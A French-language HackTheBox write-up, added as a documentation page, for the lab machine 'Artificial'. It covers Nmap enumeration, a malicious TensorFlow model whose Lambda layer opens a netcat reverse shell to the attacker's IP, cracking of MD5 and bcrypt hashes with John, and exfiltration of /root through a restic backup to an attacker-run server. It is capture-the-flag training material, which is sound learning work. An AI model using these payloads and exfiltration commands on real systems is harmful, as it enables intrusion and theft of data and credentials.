@@ -1,0 +1,179 @@
+---
+title: "Artificial"
+description: "WriteUp pour la box Artificial de HackTheBox. Exploitation d'une vulnérabilité TensorFlow pour obtenir un accès initial, puis élévation de privilèges via des backups et la récupération de hash."
+icon: "robot"
+---
+
+
+# Artificial (HTB)
+
+<Info>
+Cette box Linux "easy" de HackTheBox exploite une vulnérabilité TensorFlow pour obtenir un accès initial, puis une élévation de privilèges via des backups et la récupération de hash. Ce writeup suit une démarche pédagogique et structurée.
+</Info>
+
+## Introduction
+
+Artificial est une machine Linux orientée IA. Vous allez exploiter une faille RCE dans TensorFlow via un upload de modèle, puis escalader vos privilèges grâce à l'analyse de backups et la récupération de hash root.
+
+**Objectifs :**
+- Obtenir un shell utilisateur (gael)
+- Élever les privilèges pour obtenir root
+
+**Prérequis :**
+- Savoir utiliser Docker, John, restic, et les outils classiques de pentest
+
+## Enumération
+
+<Steps>
+<Step title="Scan Nmap">
+Lancez un scan Nmap complet pour identifier les services ouverts :
+
+```bash
+nmap -sV -A artificial.htb
+```
+
+<Frame>
+<img src="/images/htb-artificial-nmap.png" alt="Résultat du scan Nmap Artificial" />
+</Frame>
+
+Ports principaux :
+- 22/tcp : SSH (OpenSSH 8.2p1)
+- 80/tcp : HTTP (nginx 1.18.0)
+</Step>
+
+<Step title="Enumération Web">
+Accédez au site web sur le port 80. Vous pouvez créer un compte et accéder à une interface d'upload de modèles IA.
+
+Explorez les fonctionnalités et récupérez les fichiers `requirements.txt` et `Dockerfile` proposés.
+</Step>
+</Steps>
+
+## Exploitation (TensorFlow RCE)
+
+<Steps>
+<Step title="Préparation de l'environnement Docker">
+Utilisez le Dockerfile fourni pour reproduire l'environnement localement (important pour que l'exploit fonctionne) :
+
+```dockerfile
+FROM python:3.8-slim
+WORKDIR /code
+RUN apt-get update && \
+    apt-get install -y curl && \
+    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
+    rm -rf /var/lib/apt/lists/*
+RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
+ENTRYPOINT ["/bin/bash"]
+```
+</Step>
+
+<Step title="Création du modèle malicieux">
+Créez un modèle TensorFlow avec une fonction Lambda qui exécute un reverse shell :
+
+```python
+import tensorflow as tf
+def exploit(x):
+    import os
+    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc VOTRE_IP 6666 >/tmp/f")
+    return x
+model = tf.keras.Sequential()
+model.add(tf.keras.layers.Input(shape=(64,)))
+model.add(tf.keras.layers.Lambda(exploit))
+model.compile()
+model.save("exploit.h5")
+```
+Remplacez `VOTRE_IP` par l'adresse de votre machine d'attaque.
+</Step>
+
+<Step title="Upload et exécution du modèle">
+Uploadez le modèle via l'interface web, puis cliquez sur "View Predictions" pour déclencher le reverse shell.
+
+<Check>
+Vous obtenez un shell en tant qu'utilisateur `app`.
+</Check>
+</Step>
+</Steps>
+
+## Post-Exploitation (User → gael)
+
+<Steps>
+<Step title="Extraction des hashes utilisateurs">
+Dans le dossier de l'application, trouvez la base de données `users.db`.
+
+```bash
+sqlite3 users.db
+sqlite> select * from user;
+```
+Récupérez le hash MD5 de l'utilisateur `gael`.
+</Step>
+
+<Step title="Crack du hash avec John">
+Placez le hash dans un fichier et lancez John :
+
+```bash
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-md5
+```
+Le mot de passe cracké permet de passer sur l'utilisateur `gael`.
+</Step>
+</Steps>
+
+## Privesc Root
+
+<Steps>
+<Step title="Analyse des backups">
+Dans `/var/backups`, trouvez un fichier volumineux `backrest_backup.tar.gz`. Extrayez-le localement.
+
+Recherchez un fichier `config.json` contenant un hash bcrypt base64 :
+
+```bash
+cat hash.txt | base64 -d
+```
+Vous obtenez un hash bcrypt.
+</Step>
+
+<Step title="Crack du hash root">
+Utilisez John pour casser le hash :
+
+```bash
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
+```
+Vous obtenez le mot de passe root du service backup.
+</Step>
+
+<Step title="Port forwarding et exploitation restic">
+Identifiez un service local sur le port 9898. Faites un port forwarding SSH :
+
+```bash
+ssh gael@artificial.htb -L 9898:127.0.0.1:9898
+```
+Lancez un serveur restic sur votre machine, puis initiez une sauvegarde distante depuis la box :
+
+```bash
+rest-server --path /tmp/restic-data --listen :12345 --no-auth
+# Sur la box :
+restic -r rest:http://VOTRE_IP:12345/myrepo init
+restic -r rest:http://VOTRE_IP:12345/myrepo backup /root
+```
+Restaurez le snapshot sur votre machine pour obtenir `root.txt`.
+</Step>
+</Steps>
+
+## Récapitulatif et Conseils
+
+<AccordionGroup>
+<Accordion title="Résumé de la box Artificial">
+<Check>
+User : RCE TensorFlow via upload de modèle malicieux, extraction et crack du hash MD5.
+Root : Analyse de backup, extraction d'un hash bcrypt, port forwarding, exploitation restic pour récupérer /root.
+</Check>
+</Accordion>
+<Accordion title="Conseils et bonnes pratiques">
+- Toujours reproduire l'environnement cible pour les exploits complexes (Dockerfile fourni)
+- Pensez à vérifier les backups et fichiers volumineux pour des secrets
+- Utilisez les outils GTFOBins pour l'escalade de privilèges
+- Automatisez la récupération et le crack des hashes
+</Accordion>
+</AccordionGroup>
+
+<Note>
+Pour illustrer chaque étape, utilisez la balise `<Frame>` autour de vos captures d'écran.
+</Note>
